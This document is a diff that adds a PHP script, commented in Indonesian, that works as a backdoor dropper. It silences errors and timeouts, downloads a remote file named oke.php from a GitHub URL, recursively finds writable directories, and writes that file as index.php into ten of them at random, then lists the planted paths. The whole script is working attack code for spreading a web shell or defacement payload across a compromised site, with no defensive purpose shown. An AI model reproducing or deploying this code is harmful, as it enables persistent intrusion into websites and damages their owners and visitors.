@@ -1,0 +1,61 @@
+<?php
+ignore_user_abort(true);
+set_time_limit(0);
+ini_set('display_errors', 0);
+error_reporting(0);
+
+function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
+    $result = [];
+    if ($currentDepth > $maxDepth) return $result;
+    $items = @scandir($baseDir);
+    if (!$items) return $result;
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $fullPath = rtrim($baseDir, '/') . '/' . $item;
+        if (is_dir($fullPath)) {
+            if (is_writable($fullPath)) {
+                $result[] = $fullPath;
+            }
+            $result = array_merge($result, scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1));
+        }
+    }
+    return $result;
+}
+
+// Ganti URL ini dengan link RAW dari file GitHub
+$githubFileURL = 'https://github.com/riko-cup/public/blob/main/oke.php';
+
+$content = @file_get_contents($githubFileURL);
+if (!$content) {
+    exit("<div style='color:red;font-family:monospace;'>Gagal mengunduh file dari GitHub.</div>");
+}
+
+$allWritable = scanWritableDirs(__DIR__, 5);
+if (empty($allWritable)) {
+    exit("<div style='color:red;font-family:monospace;'>Tidak ada folder writable ditemukan.</div>");
+}
+
+shuffle($allWritable);
+$targetFolders = array_slice($allWritable, 0, 10);
+
+$successCount = 0;
+$uploadedPaths = [];
+
+foreach ($targetFolders as $folder) {
+    $target = $folder . DIRECTORY_SEPARATOR . 'index.php';
+    if (@file_put_contents($target, $content)) {
+        $successCount++;
+        $uploadedPaths[] = $target;
+    }
+}
+
+if ($successCount > 0) {
+    echo "<div style='color:lime;font-family:monospace;'>Berhasil menyalin ke $successCount folder:</div><ul>";
+    foreach ($uploadedPaths as $path) {
+        echo "<li><code>$path</code></li>";
+    }
+    echo "</ul>";
+} else {
+    echo "<div style='color:red;font-family:monospace;'>Gagal menyalin file ke folder manapun.</div>";
+}
+?>
